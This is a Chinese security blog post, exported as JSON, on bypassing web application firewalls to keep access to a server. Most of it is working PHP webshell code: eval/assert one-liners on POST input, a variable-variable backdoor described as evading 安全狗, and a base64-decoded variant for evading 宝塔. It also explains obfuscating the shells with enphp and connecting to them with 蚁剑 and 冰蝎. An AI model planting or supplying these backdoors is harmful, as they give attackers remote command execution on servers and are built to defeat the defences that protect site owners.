{"title":"WAF绕过-权限控制","uid":"21e0a43668edaae60c8a409447987781","slug":"WAF绕过-权限控制","date":"2022-06-11T02:42:28.000Z","updated":"2022-06-11T04:05:32.404Z","comments":true,"path":"api/articles/WAF绕过-权限控制.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.htm/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.png\" alt=\"WAF绕过-权限控制\"></p>\n<h2 id=\"0x01-变量覆盖\"><a href=\"#0x01-变量覆盖\" class=\"headerlink\" title=\"0x01 变量覆盖\"></a>0x01 变量覆盖</h2><p>一句话木马，用eval()函数将字符串转换为PHP代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @ev删掉这串汉字<span class=\"token function\">al</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>‘chop删掉这串汉字per’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>用ass删掉这串汉字ert代替eval()：</p>\n<p>（eval()会被检测）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> ass删掉这串汉字<span class=\"token function\">ert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>‘chopper’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>变量覆盖，覆盖原始变量，安全狗追踪变量时无法找到变量b的出处：</p>\n<p>后门代码：绕过安全狗</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>‘x’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>‘y’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>‘z’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n这里利用参数传递变量：$a接收x值b，而此时的b就是下面的$b,$a又接收y值assert,此时x值=y值，也就是$b=assert()；实现绕过。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用代码时传参：?x&#x3D;b&amp;y&#x3D;assert Post data：z&#x3D;需要执行的命令</p>\n<p>使用base64加密传输命令，<strong>绕过宝塔</strong>：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>‘x’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>‘y’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>‘z’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span> \n由于输入的z值可能会被宝塔检测到，例如：phpinfo()这样的函数，因此使用base64加密方式去绕过。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x02-加密混淆\"><a href=\"#0x02-加密混淆\" class=\"headerlink\" title=\"0x02 加密混淆\"></a>0x02 加密混淆</h2><p>用enphp加密来绕过检测：</p>\n<p>一句话木马：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>‘z’<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在enphp的文件夹中打开cmd，执行“php.exe code_test.php”，可以通过“func_v2.php”来调整参数，程序会自动把“code_test”文件夹下的文件加密，加密结果生成在“encoded”文件夹下。</p>\n<p><strong>原理：由于加密程度越高，越容易混淆，加密过于复杂，WAF在检测时候无法解密出原始代码，实现绕过。</strong></p>\n<p>PHP在线加密：</p>\n<p><a href=\"https://www.phpjiami.com/phpjiami.html\">https://www.phpjiami.com/phpjiami.html</a> </p>\n<h2 id=\"0x03-工具连接带有编码解码绕过的一句话\"><a href=\"#0x03-工具连接带有编码解码绕过的一句话\" class=\"headerlink\" title=\"0x03 工具连接带有编码解码绕过的一句话\"></a>0x03 工具连接带有编码解码绕过的一句话</h2><p>1、蚁剑，选中对应地址，右键“添加数据”，编码器选择对应的加密方式</p>\n<p>2、菜刀，无此功能</p>\n<p>3、冰蝎，双向加密传输</p>\n<p>冰蝎双向加密传输图解：</p>\n<p><img src=\"/post/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.htm/image-20220611120451633.png\" alt=\"image-20220611120451633\"></p>\n","text":"0x00脑图： 0x01 变量覆盖一句话木马，用eval()函数将字符串转换为PHP代码： &lt;?php @ev删掉这串汉字al($_POST[‘chop删掉这串汉字per’]);?> 用ass删掉这串汉字ert代替eval()： （eval()会被检测） &lt;?php ...","link":"","photos":[],"count_time":{"symbolsCount":959,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"Bypass WAF","slug":"Bypass-WAF","count":7,"path":"api/tags/Bypass-WAF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96\"><span class=\"toc-text\">0x01 变量覆盖</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86\"><span class=\"toc-text\">0x02 加密混淆</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5%E5%B8%A6%E6%9C%89%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D\"><span class=\"toc-text\">0x03 工具连接带有编码解码绕过的一句话</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"代码审计--PHP无框架项目SQL注入挖掘技巧","uid":"731c1533414732448019e85116b30fa4","slug":"代码审计-PHP无框架项目SQL注入挖掘技巧","date":"2022-06-11T09:55:23.000Z","updated":"2022-07-23T15:41:11.307Z","comments":true,"path":"api/articles/代码审计-PHP无框架项目SQL注入挖掘技巧.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 使用Fortify进行代码审计使用sql靶场源代码为例，颜色代表漏洞危害等级，也可调试代码，可以为繁琐的手工审计节省出大量时间。 0x02 定点挖掘0x00 关键字通过搜索特定关键字尝试寻找特定漏洞，如“select”“insert”“update”等与...","link":"","photos":[],"count_time":{"symbolsCount":574,"symbolsTime":"1 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":4,"path":"api/categories/代码审计.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"WAF绕过-漏洞利用之注入上传跨站等绕过","uid":"33e492c349a108568658a2914e822de5","slug":"WAF绕过-漏洞利用之注入上传跨站等绕过","date":"2022-06-10T14:12:41.000Z","updated":"2022-06-10T15:42:56.054Z","comments":true,"path":"api/articles/WAF绕过-漏洞利用之注入上传跨站等绕过.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 SQL注入使用如sqlmap等工具注入时，为防止CC拦截，修改数据包us头模仿爬虫，或使用代理池 安全狗：参考之前payload Aliyun：基本修改指纹即可 宝塔：匹配关键字，包括“&#x2F;*”，注入语句的每个“&#x2F;*”都改为“%00&#...","link":"","photos":[],"count_time":{"symbolsCount":614,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"Bypass WAF","slug":"Bypass-WAF","count":7,"path":"api/tags/Bypass-WAF.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}